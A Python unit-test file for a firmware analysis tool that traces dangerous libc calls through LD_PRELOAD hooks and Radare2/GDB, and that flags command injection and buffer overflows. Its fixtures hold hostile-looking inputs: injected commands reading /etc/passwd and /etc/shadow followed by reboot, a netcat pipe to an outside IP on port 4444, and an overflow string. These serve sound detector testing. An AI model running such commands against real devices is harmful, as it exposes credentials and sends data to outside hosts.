"""Unit tests for Dynamic API Hook Injector and Radare2 / r2pipe Tracer Bridge."""

import json
from pathlib import Path
import shutil
import socket
import tempfile
import unittest

from firmsight.emulator.orchestrator import MasterOrchestrator, OrchestrationConfig
from firmsight.emulator.tracer_hook import (
    APIInvocationEvent,
    DANGEROUS_APIS,
    DynamicHookInjector,
    GDBStubSession,
    HookTarget,
    Radare2Bridge,
    _get_free_port,
)


class TestRadare2Bridge(unittest.TestCase):
    """Test suite for Radare2 script and r2pipe automation generator."""

    def test_generate_r2_script(self):
        script = Radare2Bridge.generate_r2_script(gdb_port=1234)
        self.assertIn("target remote 127.0.0.1:1234", script)
        self.assertIn("e dbg.backend = gdb", script)
        self.assertIn("db sym.system", script)
        self.assertIn("db sym.strcpy", script)
        self.assertIn("dc", script)

    def test_generate_r2pipe_script(self):
        script = Radare2Bridge.generate_r2pipe_script(gdb_port=1234, target_name="httpd")
        self.assertIn("gdb://127.0.0.1:1234", script)
        self.assertIn("import r2pipe", script)
        self.assertIn('r2.cmd("aaa")', script)
        self.assertIn('r2.cmd("dc")', script)


class TestDynamicHookInjector(unittest.TestCase):
    """Test suite for DynamicHookInjector, API tracing, and manifest export."""

    def setUp(self):
        self.test_dir = Path(tempfile.mkdtemp(prefix="firmsight_trace_test_"))
        self.injector = DynamicHookInjector(workspace_dir=self.test_dir)

    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_dangerous_apis_catalog(self):
        self.assertIn("system", DANGEROUS_APIS)
        self.assertIn("popen", DANGEROUS_APIS)
        self.assertIn("strcpy", DANGEROUS_APIS)
        self.assertIn("sprintf", DANGEROUS_APIS)
        self.assertIn("gets", DANGEROUS_APIS)

        sys_target = DANGEROUS_APIS["system"]
        self.assertEqual(sys_target.risk_level, "CRITICAL")
        self.assertIn("CWE-78", sys_target.cwe)

        strcpy_target = DANGEROUS_APIS["strcpy"]
        self.assertEqual(strcpy_target.risk_level, "HIGH")
        self.assertIn("CWE-120", strcpy_target.cwe)

    def test_prepare_gdb_stub(self):
        free_port = _get_free_port()
        session = self.injector.prepare_gdb_stub("usr/sbin/httpd", port=free_port)

        self.assertIsInstance(session, GDBStubSession)
        self.assertEqual(session.gdb_port, free_port)
        self.assertIn(f"127.0.0.1:{free_port}", session.r2_connect_command)
        self.assertIn(f"127.0.0.1:{free_port}", session.gdb_attach_command)
        self.assertIn("-g", session.qemu_flags)
        self.assertIn(str(free_port), session.qemu_flags)

        # Verify trace script files created on disk
        r2_file = self.test_dir / "sandbox_workspace" / "traces" / f"r2_attach_{free_port}.r2"
        py_file = self.test_dir / "sandbox_workspace" / "traces" / f"r2pipe_trace_{free_port}.py"
        self.assertTrue(r2_file.exists())
        self.assertTrue(py_file.exists())

    def test_generate_preload_hook_source(self):
        c_code = self.injector.generate_preload_hook_source(["system", "strcpy"])
        self.assertIn("#define _GNU_SOURCE", c_code)
        self.assertIn("dlsym(RTLD_NEXT, \"system\")", c_code)
        self.assertIn("dlsym(RTLD_NEXT, \"strcpy\")", c_code)
        self.assertIn("[HOOK] FUNC=%s", c_code)

    def test_analyze_trace_log_hook_format(self):
        log_text = (
            "[HOOK] FUNC=system RISK=CRITICAL ARG=cat /etc/passwd; reboot\n"
            "[HOOK] FUNC=strcpy RISK=HIGH ARG=short_safe_string\n"
        )
        events = self.injector.analyze_trace_log(log_text)
        self.assertEqual(len(events), 2)

        # Check system event flagged with command injection
        sys_event = events[0]
        self.assertEqual(sys_event.function, "system")
        self.assertEqual(sys_event.risk_level, "CRITICAL")
        self.assertIsNotNone(sys_event.vulnerability_indicator)
        self.assertIn("Command Injection", sys_event.vulnerability_indicator)

        # Safe strcpy should not flag vulnerability
        strcpy_event = events[1]
        self.assertIsNone(strcpy_event.vulnerability_indicator)

    def test_analyze_trace_log_strace_format(self):
        strace_text = (
            '4567 system("ping -c 1 127.0.0.1") = 0\n'
            '4567 popen("ifconfig && uname -a", "r") = 0x12345678\n'
        )
        events = self.injector.analyze_trace_log(strace_text)
        self.assertEqual(len(events), 2)
        self.assertEqual(events[0].function, "system")
        self.assertEqual(events[1].function, "popen")
        self.assertIn("Command Injection", events[1].vulnerability_indicator)

    def test_detect_vulnerability_pattern(self):
        # Command injection pattern
        vuln1 = self.injector._detect_vulnerability_pattern("system", ["echo 1 | nc 1.2.3.4 4444"])
        self.assertIsNotNone(vuln1)
        self.assertIn("Command Injection", vuln1)

        # Buffer overflow pattern (buffer >= 64 bytes)
        vuln2 = self.injector._detect_vulnerability_pattern("strcpy", ["dest", "A" * 80])
        self.assertIsNotNone(vuln2)
        self.assertIn("Buffer Overflow", vuln2)

        # Safe string
        safe = self.injector._detect_vulnerability_pattern("strcpy", ["dest", "small_string"])
        self.assertIsNone(safe)

    def test_simulate_trace_for_binary(self):
        dummy_bin = self.test_dir / "httpd"
        dummy_bin.write_bytes(b"\x7fELF" + b"system" + b"strcpy" + b"\x00" * 50)

        events = self.injector.simulate_trace_for_binary(dummy_bin)
        self.assertGreater(len(events), 0)
        funcs = [e.function for e in events]
        self.assertIn("system", funcs)
        self.assertIn("strcpy", funcs)

        # Check vulnerability flagged in simulated sample
        vulns = [e for e in events if e.vulnerability_indicator is not None]
        self.assertGreater(len(vulns), 0)

    def test_export_manifest(self):
        events = [
            APIInvocationEvent(
                timestamp="2026-10-15T12:00:00Z",
                function="system",
                category="command_execution",
                cwe="CWE-78: OS Command Injection",
                risk_level="CRITICAL",
                arguments=["cat /etc/shadow; reboot"],
                caller_address="0x00401124",
                return_value="0",
                vulnerability_indicator="Command injection detected",
            )
        ]
        session = GDBStubSession(
            gdb_port=1234,
            target_binary="httpd",
            qemu_flags=["-g", "1234"],
            r2_connect_command="r2 -d gdb://127.0.0.1:1234",
            gdb_attach_command="gdb-multiarch",
            r2pipe_init_code="r2 = r2pipe.open()",
            session_id="test-sess",
            is_active=True,
        )

        out_path = self.test_dir / "trace_manifest.json"
        exported = self.injector.export_manifest(events, session=session, output_file=out_path)

        self.assertTrue(exported.exists())
        data = json.loads(exported.read_text(encoding="utf-8"))
        self.assertEqual(data["version"], "1.0.0")
        self.assertEqual(data["statistics"]["total_invocations"], 1)
        self.assertEqual(data["statistics"]["potential_vulnerabilities"], 1)
        self.assertEqual(len(data["vulnerabilities"]), 1)
        self.assertEqual(data["vulnerabilities"][0]["function"], "system")


class TestOrchestratorTracingIntegration(unittest.TestCase):
    """Test integration between MasterOrchestrator and DynamicHookInjector."""

    def setUp(self):
        self.test_dir = Path(tempfile.mkdtemp(prefix="firmsight_orch_trace_"))
        self.orchestrator = MasterOrchestrator(workspace_dir=self.test_dir)

    def tearDown(self):
        self.orchestrator.cleanup()
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def _create_mock_rootfs(self) -> Path:
        rootfs = self.test_dir / "rootfs"
        (rootfs / "usr" / "sbin").mkdir(parents=True, exist_ok=True)
        (rootfs / "etc").mkdir(parents=True, exist_ok=True)
        elf_header = (
            b"\x7fELF"
            b"\x01"
            b"\x01"
            b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x02\x00"
            b"\x28\x00"
        )
        httpd_file = rootfs / "usr" / "sbin" / "httpd"
        httpd_file.write_bytes(elf_header + b"system" + b"strcpy" + b"\x00" * 50)
        return rootfs

    def test_orchestration_run_with_tracing_enabled(self):
        rootfs = self._create_mock_rootfs()
        host_port = _get_free_port()
        gdb_port = _get_free_port()

        config = OrchestrationConfig(
            target_path=rootfs,
            work_dir=self.test_dir,
            host_port=host_port,
            guest_port=80,
            force_shim=True,
            enable_tracing=True,
            gdb_port=gdb_port,
        )

        result = self.orchestrator.run(config)

        # Verify trace manifest was created and populated
        self.assertIsNotNone(result.trace_manifest_file)
        self.assertTrue(Path(result.trace_manifest_file).exists())
        self.assertIsNotNone(result.gdb_connect_command)
        self.assertIn(str(gdb_port), result.gdb_connect_command)
        self.assertGreater(result.vulnerabilities_found, 0)

        # Verify markdown export contains Track 2 tracing section
        md = result.export_markdown()
        self.assertIn("Track 2 Dynamic Binary Analysis & Radare2 Tracing", md)
        self.assertIn("Trace Manifest:", md)
        self.assertIn("Radare2 Attachment:", md)

        # Verify persistence of last run
        last_run = self.orchestrator.get_last_run()
        self.assertIsNotNone(last_run)
        self.assertEqual(last_run.trace_manifest_file, result.trace_manifest_file)
        self.assertEqual(last_run.gdb_connect_command, result.gdb_connect_command)
        self.assertEqual(last_run.vulnerabilities_found, result.vulnerabilities_found)


if __name__ == "__main__":
    unittest.main()
